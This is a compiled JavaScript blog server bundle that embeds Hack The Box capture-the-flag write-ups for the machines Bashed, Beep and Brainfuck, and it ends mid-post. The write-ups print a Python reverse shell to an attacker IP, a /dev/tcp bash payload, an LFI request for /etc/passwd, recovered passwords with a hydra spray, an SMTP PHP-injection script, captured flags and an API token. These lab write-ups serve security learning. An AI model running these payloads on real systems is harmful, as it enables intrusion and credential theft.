'use strict';

function _interopDefault (ex) { return (ex && (typeof ex === 'object') && 'default' in ex) ? ex['default'] : ex; }

var sirv = _interopDefault(require('sirv'));
var polka = _interopDefault(require('polka'));
var compression = _interopDefault(require('compression'));
var fs = _interopDefault(require('fs'));
var path = _interopDefault(require('path'));
var freeSolidSvgIcons = require('@fortawesome/free-solid-svg-icons');
var Stream = _interopDefault(require('stream'));
var http = _interopDefault(require('http'));
var Url = _interopDefault(require('url'));
var https = _interopDefault(require('https'));
var zlib = _interopDefault(require('zlib'));

var Mod0 = {"title":"HTB - Bashed","slug":"Bashed","html":"<h1 id=\"bashed---10101068\">Bashed - 10.10.10.68</h1>\n<h1 id=\"enumeration\">Enumeration</h1>\n<h2 id=\"nmap\">Nmap</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">nmap -sC -sV -oA nmap/initial 10.10.10.68</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 05:02 EDT\nNmap scan report for 10.10.10.68\nHost is up (0.24s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Arrexel's Development Site\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 35.45 seconds</code></pre><h2 id=\"gobuster\">Gobuster</h2>\n<p>Enumerating the Apache webserver with gobuster.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">gobuster dir -t 50 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o log/gobuster.out -u http://10.10.10.68 </code></pre><pre class=\"language-bash\"><code class=\"language-bash\">/.htpasswd            (Status: 403) [Size: 295]\n/.hta                 (Status: 403) [Size: 290]\n/.htaccess            (Status: 403) [Size: 295]\n/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]\n/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]\n/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]\n/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]\n/index.html           (Status: 200) [Size: 7743]\n/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]\n/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]\n/server-status        (Status: 403) [Size: 299]\n/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]</code></pre><h2 id=\"website\">Website</h2>\n<p><img src=\"Bashed.assets/image-20210426050746209.png\" alt=\"\"></p>\n<p>The github link, <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/Arrexel/phpbash\">https://github.com/Arrexel/phpbash</a> reveals partial code of the website.</p>\n<p><img src=\"Bashed.assets/image-20210426051313928.png\" alt=\"\"></p>\n<p><img src=\"Bashed.assets/image-20210426051347480.png\" alt=\"\"></p>\n<p><img src=\"Bashed.assets/image-20210426051413896.png\" alt=\"\"></p>\n<p>Both files <strong><a target=\"_blank\" rel=\"nofollow\" href=\"http://10.10.10.68/dev/phpbash.php\">phpbash.php</a></strong> and <strong><a target=\"_blank\" rel=\"nofollow\" href=\"http://10.10.10.68/dev/phpbash.min.php\">phpbash.min.php</a></strong> looks to be the same as in the github repository. Hence source code is revealed.</p>\n<p>The page <a target=\"_blank\" rel=\"nofollow\" href=\"http://10.10.10.68/dev/phpbash.php\">http://10.10.10.68/dev/phpbash.php</a> is an interactive shell coded in php.</p>\n<p><img src=\"Bashed.assets/image-20210426051717761.png\" alt=\"\"></p>\n<h1 id=\"exploitation\">Exploitation</h1>\n<h3 id=\"getting-a-reverse-shell\">Getting a reverse shell</h3>\n<p>Going to <strong>/dev/shm</strong>, the attacker can upload a reverse shell as normally anyone can write to <strong>/dev/shm</strong>.</p>\n<p><img src=\"Bashed.assets/image-20210426053142178.png\" alt=\"\"></p>\n<p>Normally on kali linux, these are some default location where php reverse shells can be found.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">$ locate php-reverse                                                                             \n/usr/share/laudanum/php/php-reverse-shell.php\n/usr/share/laudanum/wordpress/templates/php-reverse-shell.php\n/usr/share/seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php\n/usr/share/webshells/php/php-reverse-shell.php</code></pre><p><img src=\"Bashed.assets/image-20210426052146005.png\" alt=\"\"></p>\n<p>Editing the php reverse shell to connect to the attacker&#39;s IP address.</p>\n<p><img src=\"Bashed.assets/image-20210426052531204.png\" alt=\"\"></p>\n<p>The attacker then hosts a http server and also setup <strong>nc</strong> to listen for an incoming connection on port <strong>8888</strong>.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">nc -lvnp 8888\npython3 -m http.server 80  </code></pre><p><img src=\"Bashed.assets/image-20210426053314010.png\" alt=\"\"></p>\n<p><img src=\"Bashed.assets/image-20210426053359115.png\" alt=\"\"></p>\n<p>After running the reverse shell on the server, the attacker gets a <strong>nc</strong> connection.</p>\n<p><img src=\"Bashed.assets/image-20210426053608498.png\" alt=\"\"></p>\n<p>The reverse shell is then stabilised using the following commands.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">which python # to know which python version exists\npython -c 'import pty;pty.spawn(\"/bin/bash\")' # gets a proper tty shell\n# the shell is then backgrounded using ctrl+z\nstty raw -echo # this is executed on the attackers machine\n# then press fg to resume the tty shell\nexport TERM=xterm # after setting the terminal type, the screen can now be cleared</code></pre><p><img src=\"Bashed.assets/image-20210426053953530.png\" alt=\"\"></p>\n<h2 id=\"privilege-escalation-to-scriptmanager\">Privilege Escalation to scriptmanager</h2>\n<h3 id=\"vulnerability-explanation\"><strong>Vulnerability Explanation:</strong></h3>\n<p>As can be seen below, the user <strong>www-data</strong> can execute any command as the user <strong>scriptmanager</strong> <em>without the need of a password</em></p>\n<p><img src=\"Bashed.assets/image-20210426054917421.png\" alt=\"\"></p>\n<h3 id=\"usertxt\">User.txt</h3>\n<pre class=\"language-bash\"><code class=\"language-bash\">find /home -type f -ls 2>/dev/null</code></pre><p>The above command finds everything having the type <strong>file</strong> in the directory <strong>/home</strong>, as well as listing all the attributes of each file and finally <strong>2&gt;/dev/null</strong> mean to redirect standard error to <strong>/dev/null</strong>.</p>\n<p><img src=\"Bashed.assets/image-20210426060250953.png\" alt=\"\"></p>\n<p><strong>User.txt</strong> can be found in the home directory of <strong>arrexel</strong> and it can be read anyone.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /home/arrexel/user.txt</code></pre><p><img src=\"Bashed.assets/image-20210426061019511.png\" alt=\"\"></p>\n<blockquote>\n<p>user.txt flag: <code>2c281f318555dbc1b856957c7147bfc1</code></p>\n</blockquote>\n<h2 id=\"privilege-escalation-to-root\">Privilege Escalation to Root</h2>\n<h3 id=\"roottxt\">Root.txt</h3>\n<p>The directory <strong>scripts</strong> standards out as it is not an standard directory.</p>\n<p><img src=\"Bashed.assets/image-20210426061419226.png\" alt=\"\"></p>\n<h3 id=\"vulnerability-explanation-1\"><strong>Vulnerability Explanation:</strong></h3>\n<p>Going into the directory <strong>script</strong>, it can be concluded that there has to be a <strong>cronjob</strong> running on the machine as the date created of the file <strong>test.txt</strong> keeps changing <strong>every minute</strong>.</p>\n<p><img src=\"Bashed.assets/image-20210426061811213.png\" alt=\"\"></p>\n<p>Since the script <strong>test.py</strong> is owned by <strong>scriptmanager</strong> and it is writing to the file <strong>test.txt</strong> as root. It can be said that the attacker can modify the script and it will be ran as root.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat test.py</code></pre><pre class=\"language-python\"><code class=\"language-python\">f = open(\"test.txt\", \"w\")\nf.write(\"testing 123!\")\nf.close</code></pre><p>RSG is used to generate a reverse shell in python and it also listens on the port specified. After adding the selected payload to the file <strong>test.py</strong>, it will be executed by the cronjob when it runs.</p>\n<pre class=\"language-python\"><code class=\"language-python\">import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"10.10.14.23\",8888))\nos.dup2(s.fileno(),0); os.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")\nf = open(\"test.txt\", \"w\")\nf.write(\"testing 123!\")\nf.close</code></pre><p><img src=\"Bashed.assets/image-20210426063556805.png\" alt=\"\"></p>\n<p>As soon as the <strong>cronjab</strong> executes, the attacker gets a reverse shell from the machine bashed.</p>\n<p><img src=\"Bashed.assets/image-20210426064607146.png\" alt=\"\"></p>\n<p>the <strong>root.txt</strong> file is always located in <strong>/root/</strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /root/root.txt</code></pre><p><img src=\"Bashed.assets/image-20210426065148940.png\" alt=\"\"></p>\n<blockquote>\n<p>root.txt flag: <code>cc4f0afe3a1026d402ba10329674a8e2</code></p>\n</blockquote>\n","date":"2021-04-26","excerpt":"","printDate":"April 26, 2021","printReadingTime":"4 min read"};

var route_9 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod0
});

var Mod1 = {"title":"HTB - Beep","slug":"Beep","html":"<h1 id=\"beep---1010107\">Beep - 10.10.10.7</h1>\n<h1 id=\"enumeration\">Enumeration</h1>\n<h2 id=\"nmap\">Nmap</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">nmap -sC -sV -oA nmap/initial 10.10.10.7</code></pre><pre class=\"language-bash\"><code class=\"language-bash\"># Nmap 7.91 scan initiated Tue Apr 27 06:07:34 2021 as: nmap -sC -sV -oA nmap/initial 10.10.10.7\nNmap scan report for 10.10.10.7\nHost is up (0.24s latency).\nNot shown: 988 closed ports\nPORT      STATE SERVICE    VERSION\n22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)\n| ssh-hostkey: \n|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)\n|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)\n25/tcp    open  smtp       Postfix smtpd\n|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, \n80/tcp    open  http       Apache httpd 2.2.3\n|_http-server-header: Apache/2.2.3 (CentOS)\n|_http-title: Did not follow redirect to https://10.10.10.7/\n110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4\n|_pop3-capabilities: PIPELINING UIDL TOP LOGIN-DELAY(0) APOP EXPIRE(NEVER) IMPLEMENTATION(Cyrus POP3 server v2) AUTH-RESP-CODE USER STLS RESP-CODES\n111/tcp   open  rpcbind    2 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1            875/udp   status\n|_  100024  1            878/tcp   status\n143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4\n|_imap-capabilities: Completed OK THREAD=REFERENCES NAMESPACE SORT=MODSEQ MULTIAPPEND URLAUTHA0001 MAILBOX-REFERRALS STARTTLS RENAME QUOTA LIST-SUBSCRIBED LISTEXT IMAP4 CHILDREN IDLE ID CONDSTORE LITERAL+ CATENATE BINARY ANNOTATEMORE ATOMIC ACL THREAD=ORDEREDSUBJECT UNSELECT NO RIGHTS=kxte SORT X-NETSCAPE IMAP4rev1 UIDPLUS\n443/tcp   open  ssl/https?\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Not valid before: 2017-04-07T08:22:08\n|_Not valid after:  2018-04-07T08:22:08\n|_ssl-date: 2021-04-27T10:18:48+00:00; +7m16s from scanner time.\n993/tcp   open  ssl/imap   Cyrus imapd\n|_imap-capabilities: CAPABILITY\n995/tcp   open  pop3       Cyrus pop3d\n3306/tcp  open  mysql      MySQL (unauthorized)\n|_ssl-cert: ERROR: Script execution failed (use -d to debug)\n|_ssl-date: ERROR: Script execution failed (use -d to debug)\n|_sslv2: ERROR: Script execution failed (use -d to debug)\n|_tls-alpn: ERROR: Script execution failed (use -d to debug)\n|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)\n4445/tcp  open  upnotifyp?\n10000/tcp open  http       MiniServ 1.570 (Webmin httpd)\n|_http-title: Site does not have a title (text/html; Charset=iso-8859-1).\nService Info: Hosts:  beep.localdomain, 127.0.0.1, example.com\n\nHost script results:\n|_clock-skew: 7m15s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Tue Apr 27 06:14:42 2021 -- 1 IP address (1 host up) scanned in 427.79 seconds</code></pre><h2 id=\"website\">Website</h2>\n<p>Going to <a target=\"_blank\" rel=\"nofollow\" href=\"http://10.10.10.7/\">http://10.10.10.7/</a>, redirects the attacker to <a target=\"_blank\" rel=\"nofollow\" href=\"https://10.10.10.7/\">https://10.10.10.7/</a>.</p>\n<p>What is elastix?</p>\n<p>Elastix is an unified communications server software that brings together IP PBX, email, IM, faxing and collaboration functionality. It has a Web interface and includes capabilities such as a call center software with predictive dialing.</p>\n<p><img src=\"Beep.assets/image-20210429022801188.png\" alt=\"\"></p>\n<h2 id=\"gobuster\">Gobuster</h2>\n<p>Enumerating the webserver with gobuster.</p>\n<p>Running with <strong>-k</strong> disables checks for tls verification.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">gobuster dir -t 50 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o log/gobuster.out -u https://10.10.10.7 -k</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">/.htpasswd            (Status: 403) [Size: 287]\n/.htaccess            (Status: 403) [Size: 287]\n/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]\n/cgi-bin/             (Status: 403) [Size: 286]\n/configs              (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/]\n/favicon.ico          (Status: 200) [Size: 894]\n/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/]\n/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/]\n/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]\n/libs                 (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/]\n/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]\n/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/]\n/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]\n/recordings           (Status: 301) [Size: 314] [--> https://10.10.10.7/recordings/]\n/robots.txt           (Status: 200) [Size: 28]\n/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/]\n/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/]\n/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/]\n/vtigercrm            (Status: 301) [Size: 313] [--> https://10.10.10.7/vtigercrm/]</code></pre><p>Going to <a target=\"_blank\" rel=\"nofollow\" href=\"https://10.10.10.7/admin\">https://10.10.10.7/admin</a>, the attacker is prompted by a login page from <strong>FreePBX Administration</strong>.</p>\n<p><img src=\"Beep.assets/image-20210429030531207.png\" alt=\"\"></p>\n<p>Upon Clicking cancel, the attacker is redirected to <a target=\"_blank\" rel=\"nofollow\" href=\"https://10.10.10.7/admin/config.php\">https://10.10.10.7/admin/config.php</a>, where the version of FreePBX is revealed to be <strong>2.8.1.4</strong>.</p>\n<p><img src=\"Beep.assets/image-20210429030535503.png\" alt=\"\"></p>\n<p>Going to <a target=\"_blank\" rel=\"nofollow\" href=\"https://10.10.10.7/configs/\">https://10.10.10.7/configs/</a>, directory listings is enable.</p>\n<p><img src=\"Beep.assets/image-20210429031035862.png\" alt=\"\"></p>\n<p>Going to <a target=\"_blank\" rel=\"nofollow\" href=\"https://10.10.10.7/vtigercrm/\">https://10.10.10.7/vtigercrm/</a>, the attacker is presented with a <em>vtiger 5 crm</em> login page.</p>\n<p><img src=\"Beep.assets/image-20210429063246363.png\" alt=\"\"></p>\n<p>Searchsploit is used to search known exploits for:  elastix</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">searchsploit elastix</code></pre><p><img src=\"Beep.assets/image-20210429064303509.png\" alt=\"\"></p>\n<p>A local file inclusion vulnerability is discovered using the command <code>searchsploit -x php/webapps/37637.pl</code></p>\n<p><img src=\"Beep.assets/image-20210429064305972.png\" alt=\"\"></p>\n<h1 id=\"exploitation-method-1\">Exploitation Method 1</h1>\n<h2 id=\"method-1-lfi-and-password-spray-to-root\">Method 1: LFI and Password Spray to Root</h2>\n<h3 id=\"vulnerability-explanation\"><strong>Vulnerability Explanation:</strong></h3>\n<p>Elastix is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input. An attacker can exploit this vulnerability to view files and execute local scripts in the context of the web server process. This may aid in further attacks.</p>\n<p>source: <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.exploit-db.com/exploits/37637\">https://www.exploit-db.com/exploits/37637</a></p>\n<h3 id=\"proof-of-concept\">Proof Of Concept</h3>\n<p>The LFI payload from the file *<em>php/webapps/37637.pl *</em> is tested manually using burp.</p>\n<p><img src=\"Beep.assets/image-20210429065104719.png\" alt=\"\"></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">AMPDBHOST=localhost\nAMPDBENGINE=mysql\n# AMPDBNAME=asterisk\nAMPDBUSER=asteriskuser\n# AMPDBPASS=amp109\nAMPDBPASS=jEhdIekWmdjE\nAMPENGINE=asterisk\nAMPMGRUSER=admin\n#AMPMGRPASS=amp111\nAMPMGRPASS=jEhdIekWmdjE</code></pre><h3 id=\"getting-a-shell\">Getting a shell</h3>\n<p>The following request can be used to get a list of users having a shell from <strong>/etc/passwd</strong>.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">GET /vtigercrm/graph.php?current_language=../../../../../../../../../etc/passwd%00&amp;module=Accounts&amp;action= HTTP/1.1\nHost: 10.10.10.7\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</code></pre><p>Once the content of the passwd file is saved to a file, all the users can be easily </p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat passwd | grep \"bash\" | awk -F\\: '{print $1}' > users</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">root\nmysql\ncyrus\nasterisk\nspamfilter\nfanis</code></pre><p>A password file can be generated using the initial payload file.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat tmp | awk -F\\= '{print $2}' | sort -u > password</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">admin\namp109\namp111\nasterisk\nasteriskuser\njEhdIekWmdjE\nlocalhost\nmysql</code></pre><p>A password spray attack using hydra can now be used with the list of users and password.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">hydra -L users -P password ssh://10.10.10.7 -t 4\n[ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE</code></pre><p>The attacker can now successfully login as the <strong>root</strong> user using th credentials <code>root:jEhdIekWmdjE</code>.</p>\n<p>However while logging in using ssh, an error is preventing the attacker from logging in.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">$ ssh root@10.10.10.7\nUnable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1</code></pre><p>After researching the issue, a solution was provided on <a target=\"_blank\" rel=\"nofollow\" href=\"https://unix.stackexchange.com/questions/402746/ssh-unable-to-negotiate-no-matching-key-exchange-method-found\">https://unix.stackexchange.com/questions/402746/ssh-unable-to-negotiate-no-matching-key-exchange-method-found</a>.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">ssh root@10.10.10.7 -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc </code></pre><p>After using the ssh command above, the attacker can successfully login to the system.</p>\n<h1 id=\"exploitation-method-2\">Exploitation Method 2</h1>\n<h2 id=\"method-2-smtp-to-low-privilege-shell\">Method 2: SMTP To Low Privilege Shell</h2>\n<h3 id=\"vulnerability-explanation-1\"><strong>Vulnerability Explanation:</strong></h3>\n<p>Since <strong>SMTP</strong> is being used, if a user has a mail account configured, it can be accessed on the user&#39;s mail location <strong>/var/mail/user</strong>. The attacker can mail a user, a php payload, and then read the mail location using the local file inclusion to execute the php payload on the webserver.</p>\n<p>The enumeration steps can be followed from here: <a target=\"_blank\" rel=\"nofollow\" href=\"https://book.hacktricks.xyz/pentesting/pentesting-smtp\">https://book.hacktricks.xyz/pentesting/pentesting-smtp</a></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">telnet 10.10.10.7 25\n...[snip]...\n220 beep.localdomain ESMTP Postfix\nEHLO anubhav@locahost.com \n# EHLO = Enhanced Hello is used to identify the attacker with the server\n...[snip]...\nVRFY asterisk@localhost\n252 2.0.0 asterisk@localhost\n# VRFY = Verify is used to check if a user exist</code></pre><p><img src=\"Beep.assets/image-20210429093138445.png\" alt=\"\"></p>\n<p>The user asterisk is chosen as he was already included in the telephony backend engine from the LFI vulnerabilty.</p>\n<pre class=\"language-python\"><code class=\"language-python\">from email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\nimport smtplib\nimport sys\n\nlhost = \"127.0.0.1\"\nlport = 443\nrhost = \"10.10.10.7\"\nrport = 25 # 489,587\n\n# create message object instance\nmsg = MIMEMultipart()\n\n# setup the parameters of the message\npassword = \"\" \nmsg['From'] = \"anubhav@localhost\"\nmsg['To'] = \"asterisk@localhost\"\nmsg['Subject'] = \"This is not a drill!\"\n\n# payload \n# message = (\"<span class=\"token prolog\">&lt;?php system('bash -i >&amp; /dev/tcp/%s/%d 0>&amp;1'); ?></span>\" % (lhost,lport))\nmessage = ('<span class=\"token prolog\">&lt;?php echo(\"test test test\"); ?></span>')\n\nprint(\"[*] Payload is generated : %s\" % message)\n\nmsg.attach(MIMEText(message, 'plain'))\nserver = smtplib.SMTP(host=rhost,port=rport)\n\nif server.noop()[0] != 250:\n    print(\"[-]Connection Error\")\n    exit()\n\n# server.starttls()\n\n# Uncomment if log-in with authencation\n# server.login(msg['From'], password)\n\nserver.sendmail(msg['From'], msg['To'], msg.as_string())\nserver.quit()\n\nprint(\"[***]successfully sent email to %s:\" % (msg['To']))</code></pre><p>The script is modified to display <strong>&quot;test test test&quot;</strong> instead of getting the reverse shell directly. This is done in order to check whether the script is working properly or not.</p>\n<p><img src=\"Beep.assets/image-20210429092550027.png\" alt=\"\"></p>\n<p>As can be seen above, the text &quot;test test test&quot; is being printed, hence the php payload got executed.</p>\n<p>The script can now be modified to get a reverse shell and the attacker starts to listen on port <strong>8888</strong>.</p>\n<p><img src=\"Beep.assets/image-20210429093007417.png\" alt=\"\"></p>\n<p>Once the script is ran, the LFI vulnerabilty is used to read the user <strong>asterisk</strong> mail content, and a reverse shell connection is obtained.</p>\n<p><img src=\"Beep.assets/image-20210429093521602.png\" alt=\"\"></p>\n<p>It is a good sign that there is no response on burp as the page will hang if it is connected to the netcat session.<img src=\"Beep.assets/image-20210429093541822.png\" alt=\"\"></p>\n<p>A reverse shell as the user <strong>asterisk</strong> from the server is obtained .</p>\n<p><img src=\"Beep.assets/image-20210429093742595.png\" alt=\"\"></p>\n<p><img src=\"Beep.assets/image-20210429094839741.png\" alt=\"\"></p>\n<h2 id=\"privilege-escalation-to-root\">Privilege Escalation to Root</h2>\n<p>Running the command <code>sudo -l</code>, the attacker can know which commands can be run as root without password from the current user.</p>\n<p>Nmap has a known privilege escalation technique, when run with the <strong>--interactive</strong> flag, it can drop a shell when <code>!sh</code> is ran in the prompt.</p>\n<p><img src=\"Beep.assets/image-20210429095234711.png\" alt=\"\"></p>\n<h3 id=\"usertxt\">User.txt</h3>\n<pre class=\"language-bash\"><code class=\"language-bash\">find /home -type f -ls 2>/dev/null</code></pre><p><strong>User.txt</strong> can be found in the home directory of <strong>fanis</strong>.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /home/fanis/user.txt</code></pre><p><img src=\"Beep.assets/image-20210429081050948.png\" alt=\"\"></p>\n<blockquote>\n<p>user.txt flag: <code>e0492fb5a4a0ae34aac2c723e1a0db45</code></p>\n</blockquote>\n<h3 id=\"roottxt\">Root.txt</h3>\n<p>the <strong>root.txt</strong> file is always located in <strong>/root/</strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /root/root.txt</code></pre><p><img src=\"Beep.assets/image-20210429081222144.png\" alt=\"\"></p>\n<blockquote>\n<p>root.txt flag: <code>61af6c4db62d6f8902fe1169ed35bf10</code></p>\n</blockquote>\n","date":"2021-04-28","excerpt":"","printDate":"April 28, 2021","printReadingTime":"8 min read"};

var route_11 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod1
});

var Mod2 = {"title":"HTB - Brainfuck","slug":"Brainfuck","html":"<h1 id=\"brainfuck---10101017\">Brainfuck - 10.10.10.17</h1>\n<h1 id=\"enumeration\">Enumeration</h1>\n<h2 id=\"nmap\">Nmap</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">nmap -p- -T4 -oA nmap/quick 10.10.10.17</code></pre><pre class=\"language-bash\"><code class=\"language-bash\"># Nmap 7.91 scan initiated Fri Apr 23 09:17:23 2021 as: nmap -p- -T4 -oA nmap/quick 10.10.10.17\nNmap scan report for www.brainfuck.htb (10.10.10.17)\nHost is up (0.24s latency).\nNot shown: 65530 filtered ports\nPORT    STATE SERVICE\n22/tcp  open  ssh\n25/tcp  open  smtp\n110/tcp open  pop3\n143/tcp open  imap\n443/tcp open  https\n\n# Nmap done at Fri Apr 23 09:21:49 2021 -- 1 IP address (1 host up) scanned in 265.59 seconds</code></pre><h2 id=\"website\">Website</h2>\n<h3 id=\"https10101017\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://10.10.10.17\">https://10.10.10.17</a></h3>\n<p><img src=\"Brainfuck.assets/image-20210423092517149.png\" alt=\"\"></p>\n<h3 id=\"ssl-cert\">SSL Cert</h3>\n<p><img src=\"brainfuck.assets/image-20210423092213672.png\" alt=\"\"></p>\n<p>user : <strong><a target=\"_blank\" rel=\"nofollow\" href=\"mailto:orestis@brainfuck.htb\">orestis@brainfuck.htb</a></strong></p>\n<p>DNS Name: <strong><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.brainfuck.htb\">www.brainfuck.htb</a>, sup3rs3cr3t.brainfuck.htb</strong></p>\n<p>The dns names are added to <strong>/etc/hosts</strong></p>\n<p><img src=\"brainfuck.assets/image-20210423092844295.png\" alt=\"\"></p>\n<h3 id=\"sup3rs3cr3tbrainfuckhtb\">sup3rs3cr3t.brainfuck.htb</h3>\n<p>sup3rs3cr3t.brainfuck.htb is a forum webpage.</p>\n<p><img src=\"brainfuck.assets/image-20210423100437959.png\" alt=\"\"></p>\n<h3 id=\"wwwbrainfuckhtb---brainfuckhtb\"><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.brainfuck.htb\">www.brainfuck.htb</a> -&gt; brainfuck.htb</h3>\n<p><strong><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.brainfuck.htb\">www.brainfuck.htb</a></strong> redirects to <strong>brainfuck.htb</strong> which is a <em>wordpress</em> website.</p>\n<p><img src=\"brainfuck.assets/image-20210423100221583.png\" alt=\"\"></p>\n<p><strong>wpscan</strong> is ran against the <strong><a target=\"_blank\" rel=\"nofollow\" href=\"https://brainfuck.htb\">https://brainfuck.htb</a></strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">wpscan --api-token \"zwHNCijstkXlttJouhoslFZG0MYms5Bvks9FMVexaAs\" --url \"https://brainfuck.htb\" --disable-tls-checks -o wpscan.log</code></pre><p><img src=\"brainfuck.assets/image-20210423104733666.png\" alt=\"\"></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">searchsploit WP Support Plus</code></pre><p><img src=\"brainfuck.assets/image-20210423120100898.png\" alt=\"\"></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">wpscan --url \"https://brainfuck.htb\" --disable-tls-checks --enumerate u -o wpscan_enumerate_user.log </code></pre><p><img src=\"brainfuck.assets/image-20210423104514064.png\" alt=\"\"></p>\n<p>Users found:</p>\n<ul>\n<li>admin</li>\n<li>administrator</li>\n</ul>\n<h1 id=\"exploitation\">Exploitation</h1>\n<h2 id=\"brainfuckhtb\">brainfuck.htb</h2>\n<h3 id=\"searchploit\">Searchploit</h3>\n<p>During enumeration, it was found that the <strong>WP Support Plus</strong> plugin is vulnerable to a <strong>Privilege Escalation</strong> attack.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">searchsploit WP Support Plus </code></pre><p><img src=\"brainfuck.assets/image-20210424055551012.png\" alt=\"\"></p>\n<pre class=\"language-\"><code class=\"language-\">searchsploit -x php/webapps/41006.txt </code></pre><p><img src=\"brainfuck.assets/image-20210424060023915.png\" alt=\"\"></p>\n<h3 id=\"privilege-escalation-to-admin-on-wordpress\">Privilege Escalation to admin on wordpress</h3>\n<p>Using the users enumerated from wpscan, this attack can be performed.\nThe payload was modified as show below.</p>\n<p><img src=\"brainfuck.assets/image-20210424063910309.png\" alt=\"\"></p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://brainfuck.htb/wp-admin/admin-ajax.php<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        Username: <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token 